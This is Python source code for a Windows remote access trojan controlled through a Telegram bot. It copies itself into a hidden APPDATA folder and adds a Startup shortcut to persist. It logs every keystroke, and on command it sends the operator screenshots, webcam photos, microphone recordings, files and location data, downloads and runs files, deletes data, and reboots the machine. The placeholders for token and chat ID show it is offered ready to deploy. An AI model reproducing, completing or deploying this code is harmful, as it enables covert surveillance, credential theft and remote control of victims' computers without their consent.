# -*- coding: utf-8 -*-
from cv2 import VideoCapture, imwrite
from PIL import ImageGrab 								# /capture_pc
from shutil import copyfile, copyfileobj, rmtree, move 	# /ls, /pwd, /cd, /copy, /mv
from sys import argv, path, stdout 						# console output
from json import loads 									# reading json from ipinfo.io
from winshell import startup 							# persistence
from tendo import singleton								# this makes the application exit if there's another instance already running
from win32com.client import Dispatch					# WScript.Shell
from time import strftime, sleep					
import psutil											# updating	
import win32clipboard                                   # Register clipboard    

import datetime											# /schedule
import time
import threading 										# /proxy, /schedule
import pyaudio, wave 									# /hear
import telepot, requests 								# telepot => telegram, requests => file download
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import os, os.path, platform, ctypes
import pyHook, pythoncom 								# keylogger
import socket											# internal IP
import getpass											# get username
import collections
import urllib
import speech                                           #/say






me = singleton.SingleInstance()


token = 'Put Your Token Here'
app_name = 'SuperCoolProgram'                                      # Change it to anything you want
ChatID = 'put your Chat ID Here'                                   # this bot can only reply to you


if not app_name in argv[0]:
	cmd = "taskkill -f -im " + app_name + ".exe"     # this makes the bot update if the exe's name is not app_name
	os.system(cmd)


appdata_roaming_folder = os.environ['APPDATA']
hide_folder = appdata_roaming_folder + '\\' + app_name	
compiled_name = app_name + '.exe'

target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
if not os.path.exists(hide_folder):
	os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
try:
	hide_compiled = hide_folder + '\\' + compiled_name
	if not os.path.exists(hide_compiled):	
		copyfile(argv[0], hide_compiled)
	else:
		x = 7
except:
	x = 42
	

curr_window = None
user = os.environ.get("USERNAME")	# Windows username to append keylogs
schedule = {}
wname = platform.uname()[1]
log_file = hide_folder + '\\%s.txt' % wname
version = '1.0.0'                   # Version Number
screenshotfile = wname + ".jpg"



killSpeechUXWiz = "taskkill -f -im SpeechUXWiz.exe"
os.system(killSpeechUXWiz)





	

	
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")

	
def runStackedSchedule(everyNSeconds):
	for k in schedule.keys():
		if k < datetime.datetime.now():
			handle(schedule[k])
			del schedule[k]
	threading.Timer(everyNSeconds, runStackedSchedule).start()
	os.popen('REM')
def internalIP():
	internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	internal_ip.connect(('google.com', 0))
	return internal_ip.getsockname()[0]
	
def checkchat_id(chat_id):
	return len(ChatID) == 0 or str(chat_id) in ChatID
def get_curr_window():
		user32 = ctypes.windll.user32
		kernel32 = ctypes.windll.kernel32
		hwnd = user32.GetForegroundWindow()
		pid = ctypes.c_ulong(0)
		user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
		process_id = "%d" % pid.value
		executable = ctypes.create_string_buffer("\x00" * 512)
		h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
		ctypes.windll.psapi.GetModuleBaseNameA(h_process, None, ctypes.byref(executable), 512)
		window_title = ctypes.create_string_buffer("\x00" * 512)
		length = user32.GetWindowTextA(hwnd, ctypes.byref(window_title), 512)
		pid_info = "\n[ PID %s - %s - %s ]" % (process_id, executable.value, window_title.value)
		kernel32.CloseHandle(hwnd)
		kernel32.CloseHandle(h_process)
		return pid_info
	
def pressed_chars(event):
	data = None
	global curr_window
	if event.WindowName != curr_window:
		curr_window = event.WindowName
		fp = open(log_file, 'a')
		data = get_curr_window()
		fp.write(data + "\n")
		fp.close()
	if event and type(event.Ascii) == int:
		f = open(log_file,"a")
		if len(event.GetKey()) > 1:
			tofile = '<'+event.GetKey()+'>'
		else:
			tofile = event.GetKey()
		if not tofile == '<Return>':
			stdout.write(tofile)
		f.write(tofile)
		f.close()
	return not keyboardFrozen

	
def split_string(n, st):
	lst = ['']
	for i in str(st):
		l = len(lst) - 1
		if len(lst[l]) < n:
			lst[l] += i
		else:
			lst += [i]
	return lst
	
def send_safe_message(bot, chat_id, message):
	while(1):
		try:
			bot.sendMessage(chat_id, message)
			break
		except:
			pass
	
def handle(msg):
	chat_id = msg['chat']['id']
	if checkchat_id(chat_id):
		response = ''
		if 'text' in msg:
			print '\n\t\tGot message from ' + str(chat_id) + ': ' + msg['text'] + '\n\n'
			command = msg['text']
			if command == '/arp':
				response = ''
				bot.sendChatAction(chat_id, 'typing')
				lines = os.popen('arp -a -N ' + internalIP())
				for line in lines:
					line.replace('\n\n', '\n')
					response += line
			elif command == '/capture_pc':
				bot.sendChatAction(chat_id, 'typing')
				screenshot = ImageGrab.grab()
				screenshot.save(screenshotfile)
				bot.sendChatAction(chat_id, 'upload_photo')
				bot.sendDocument(chat_id, open(screenshotfile, 'rb'))
				os.remove(screenshotfile)
			
			elif command.startswith('/say'):
				word = command.replace("/say", "")				
				
				if len(word) == 0:
					response = wname + ": usage: /say <word>"
				else:
					speech.say(str(word))
					response = wname + ": said:" + str(word)
			
			
			elif command.startswith('/cd'):
				command = command.replace('/cd ','')
				try:
					os.chdir(command)
					response = wname + ': ' + os.getcwd() + '>'
				except:
					response = wname + ': No subfolder matching ' + command

			elif command == '/camera':
				
				bot.sendChatAction(chat_id, 'typing')
				camera_port = 0
				ramp_frames = 30
				camera = VideoCapture(camera_port)
				def get_image():
					retval, im = camera.read()
					return im
				for i in xrange(ramp_frames):
					temp = get_image()
				print("Taking image...")
				camera_capture = get_image()
				campic = wname + "_camera_"+ str(camera_port) +".png"
				try:
					imwrite(campic, camera_capture)
					bot.sendChatAction(chat_id, 'upload_photo')
					bot.sendDocument(chat_id, open(campic, 'rb'))
				except:
					response = wname + ": unable to get picture from Camera " + str(camera_port)
					
				os.remove(campic)


			elif command.startswith('/wget'):
				url = command.replace('/wget ', '')
				filename = url.split('/')[-1]

				if url.startswith('http') or url.startswith('ftp'):
					urllib.urlretrieve(url, filename)
					response = wname + ': Downloaded '+ filename					
				else:
					response = wname + ': usage:\n /wget http://url.to/file.exe'

			elif command.startswith('/delete'):
				command = command.replace('/delete', '')
				path_file = command.strip()
				try:
					os.remove(path_file)
					response = wname + ': Succesfully removed file'
				except:
					try:
						os.rmdir(path_file)
						response = wname + ': Succesfully removed folder'
					except:
						try:
							shutil.rmtree(path_file)
							response = wname + ': I succesfully removed folder and it\'s files'
						except:
							response = wname + ': I Can not find that file '
			elif command == '/dns':
				bot.sendChatAction(chat_id, 'typing')
				response =  wname + ": removed due to stability issues"

			elif command.startswith('/download'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/download', '')
				path_file = path_file[1:]
				if path_file == '':
					response = wname + ': /download C:/path/to/file.name or /download file.name'
				else:
					bot.sendChatAction(chat_id, 'upload_document')
					try:
						bot.sendDocument(chat_id, open(path_file, 'rb'))
					except:
						try:
							bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
							response = wname + ': Found in hide_folder: ' + hide_folder
						except:
							response = wname + ': I Could not find ' + path_file
			
				response = wname + ': Files ' + command[1:3] + 'coded succesfully.'
			elif command.startswith('/cp'):
				command = command.replace('/cp', '')
				command = command.strip()
				if len(command) > 0:
					try:
						file1 = command.split('"')[1];
						file2 = command.split('"')[3];
						copyfile(file1, file2)
						response = 'Files copied succesfully.'
					except Exception as e:
						response = wname + ': Error: \n' + str(e)
				else:
					response = wname + ': Usage: \n/cp "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
			
			
			elif command.startswith('/hear'):
				SECONDS = -1
				try:
					SECONDS = int(command.replace('/hear','').strip())
				except:
					SECONDS = 5
				 
				CHANNELS = 2
				CHUNK = 1024
				FORMAT = pyaudio.paInt16
				RATE = 44100
				 
				audio = pyaudio.PyAudio()
				bot.sendChatAction(chat_id, 'typing')
				stream = audio.open(format=FORMAT, channels=CHANNELS,
								rate=RATE, input=True,
								frames_per_buffer=CHUNK)
				frames = []
				for i in range(0, int(RATE / CHUNK * SECONDS)):
					data = stream.read(CHUNK)
					frames.append(data)
				stream.stop_stream()
				stream.close()
				audio.terminate()
				
				wav_path = hide_folder + '\\' + wname +'.wav'
				waveFile = wave.open(wav_path, 'wb')
				waveFile.setnchannels(CHANNELS)
				waveFile.setsampwidth(audio.get_sample_size(FORMAT))
				waveFile.setframerate(RATE)
				waveFile.writeframes(b''.join(frames))
				waveFile.close()
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
			elif command == '/ip_info':
				bot.sendChatAction(chat_id, 'find_location')
				info = requests.get('http://ipinfo.io').text #json format
				location = (loads(info)['loc']).split(',')
				bot.sendLocation(chat_id, location[0], location[1])
				import string
				import re
				response = wname + ': External IP: ' 
				response += "".join(filter(lambda char: char in string.printable, info))
				response = re.sub('[:,{}\t\"]', '', response)
				response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
			elif command == '/keylogs':
				bot.sendChatAction(chat_id, 'upload_document')
				bot.sendDocument(chat_id, open(log_file, "rb"))
			elif command.startswith('/ls'):
				bot.sendChatAction(chat_id, 'typing')
				command = command.replace('/ls', '')
				command = command.strip()
				files = []
				if len(command) > 0:
					files = os.listdir(command)
				else:
					files = os.listdir(os.getcwd())
				human_readable = ''
				for file in files:
					human_readable += file + '\n'
				response = wname + ":\n" + human_readable
			elif command.startswith('/msg_box'):
				message = command.replace('/msg_box', '')
				if message == '':
					response = wname + ': /msg_box yourText'
				else:
					ctypes.windll.user32.MessageBoxW(0, message, u'Information', 0x40)
					response = wname + ': MsgBox displayed'
			elif command.startswith('/mv'):
				command = command.replace('/mv', '')
				if len(command) > 0:
					try:
						file1 = command.split('"')[1];
						file2 = command.split('"')[3];
						move(file1, file2)
						response = wname + ': Files moved succesfully.'
					except Exception as e:
						response = wname + ': Error: \n' + str(e)
				else:
					response = wname + ': Usage: \n/mv "C:/path/to/file.jpg" "C:/path/to/[file.jpg]"'
					response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
			elif command == '/pc_info':
				bot.sendChatAction(chat_id, 'typing')
				info = ''
				for pc_info in platform.uname():
					info += '\n' + pc_info
				info += '\n' + 'Username: ' + getpass.getuser()
				response = wname + ': ' + info
			elif command == '/ping':
				response = wname + " running Version " + version
			elif command.startswith('/play'):
				command = command.replace('/play', '')
				command = command.strip()
				if len(command) > 0:
					systemCommand = 'start \"\" \"https://www.youtube.com/embed/'
					systemCommand += command
					systemCommand += '?autoplay=1&showinfo=0&controls=0\"'
					if os.popen(systemCommand) == 0:
						response = wname + ': YouTube video is now playing'
					else:
						response = wname + ': Failed playing YouTube video'
				else:
					response = wname + ': /play <VIDEOID>\n/play A5ZqNOJbamU'
			elif command == '/proxy':
				threading.Thread(target=proxy.main).start()
				info = requests.get('http://ipinfo.io').text #json format
				ip = (loads(info)['ip'])
				response = wname + ': Proxy succesfully setup on ' + ip + ':8081'
			elif command == '/pwd':
				response = wname + ': ' + os.getcwd()
			elif command == '/reboot':
				bot.sendChatAction(chat_id, 'typing')
				command = os.popen('shutdown /r /f /t 0')
				response = wname + ' will be restarted NOW.'
			elif command.startswith('/run'):
				bot.sendChatAction(chat_id, 'typing')
				path_file = command.replace('/run', '')
				path_file = path_file[1:]
				if path_file == '':
					response = wname + ': /run C:/path/to/file'
				else:
					try:
						os.startfile(path_file)
						response = wname + ': File ' + path_file + ' has been run'
					except:
						try:
							os.startfile(hide_folder + '\\' + path_file)
							response = wname + ': File ' + path_file + ' has been run from hide_folder'
						except:
							response = wname + ': File not found'
			elif command.startswith('/schedule'):
				command = command.replace('/schedule', '')
				if command == '':
					response = wname + ': /schedule 2017 12 24 23 59 /msg_box happy christmas'
				else:
					scheduleDateTimeStr = command[1:command.index('/') - 1]
					scheduleDateTime = datetime.datetime.strptime(scheduleDateTimeStr, '%Y %m %d %H %M')
					scheduleMessage = command[command.index('/'):]
					schedule[scheduleDateTime] = {'text' : scheduleMessage, 'chat' : { 'id' : chat_id }}
					response = wname + ': Schedule set: ' + scheduleMessage
					runStackedSchedule(10)

			
			elif command == '/shutdown':
				bot.sendChatAction(chat_id, 'typing')
				command = os.popen('shutdown /s /f /t 0')
				response = wname + ': Computer will be shutdown NOW.'
			
			elif command == '/tasklist':
				lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
				response2 = ''
				for line in lines:
					line.replace('\n\n', '\n')
					if len(line)>2000:
						response2 +=line
					else:
						response += line
				response += '\n' + response2
			elif command.startswith('/to'):
				command = command.replace('/to','')
				if command == '':
					response = wname + ': /to <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Message'
				else:
					targets = command[:comgmand.index('/')]
					if wname in targets:
						command = command.replace(targets, '')
						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
						handle(msg)
				
			
			
			elif command.startswith('/wallpaper'):
				command = command.replace('/wallpaper', '')
				command = command.strip()
				if len(command) == 0:
					response = wname + ': Usage: /wallpaper <image path>or /wallpaper <URL>'
				elif command.startswith('http'):
					image = command.rsplit('/',1)[1]
					image = hide_folder + '/' + image
					urllib.urlretrieve(command, image)
					ctypes.windll.user32.SystemParametersInfoW(20, 0, image, 3)
				else:
					ctypes.windll.user32.SystemParametersInfoW(20, 0, command.replace('/', '//'), 3)
					response = wname + ': Wallpaper succesfully set.'
			elif command == '/help':
				# functionalities dictionary: command:arguments
				functionalities = { '/arp' : '', \
						'/say':'<word or sentence>', \
						'/capture_pc' : '', \
						'/cd':'<target_dir>', \
						'/delete':'<target_file>', \
						'/camera':' takes webcam picture', \
						'/download':'<target_file>', \
						'/hear':'[time in seconds, default=5s]', \
						'/ip_info':'', \
						'/keylogs':'', \
						'/ls':'[target_folder]', \
						'/msg_box':'<text>', \
						'/pc_info':'', \
						'/play':'<youtube_videoId>', \
						'/pwd':'', \
						'/reboot':'', \
						'/run':'<target_file>', \
						'/shutdown':'', \
						'/tasklist':'', \
						'/to':'<target_computer>, [other_target_computer]',\
						'/update':'',\
						'/wallpaper':'<target_file>', \						
						'/wget':'<http://url.to/file.exe>', \
						}
				response = "\n".join(command + ' ' + description for command,description in sorted(functionalities.items()))
			else: # redirect to /help
				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
				handle(msg)
		else: # Upload a file to target
			file_name = ''
			file_id = None
			if 'document' in msg:
				file_name = msg['document']['file_name']
				file_id = msg['document']['file_id']
			elif 'photo' in msg:
				file_time = int(time.time())
				file_id = msg['photo'][1]['file_id']
				file_name = file_id + '.jpg'
			file_path = bot.getFile(file_id=file_id)['file_path']
			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
			file = (requests.get(link, stream=True)).raw
			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
				copyfileobj(file, out_file)
			response = 'File saved as ' + file_name
		if response != '':
			responses = split_string(4096, response)
			for resp in responses:
				send_safe_message(bot, chat_id, resp)#
			
bot = telepot.Bot(token)
bot.message_loop(handle)

Greetings = wname + " running Version: " + version


send_safe_message(bot, ChatID, Greetings)


killSpeechUXWiz = "taskkill -f -im SpeechUXWiz.exe"
os.system(killSpeechUXWiz)                       

hookManager = pyHook.HookManager()
hookManager.KeyDown = pressed_chars
hookManager.HookKeyboard()
pythoncom.PumpMessages()

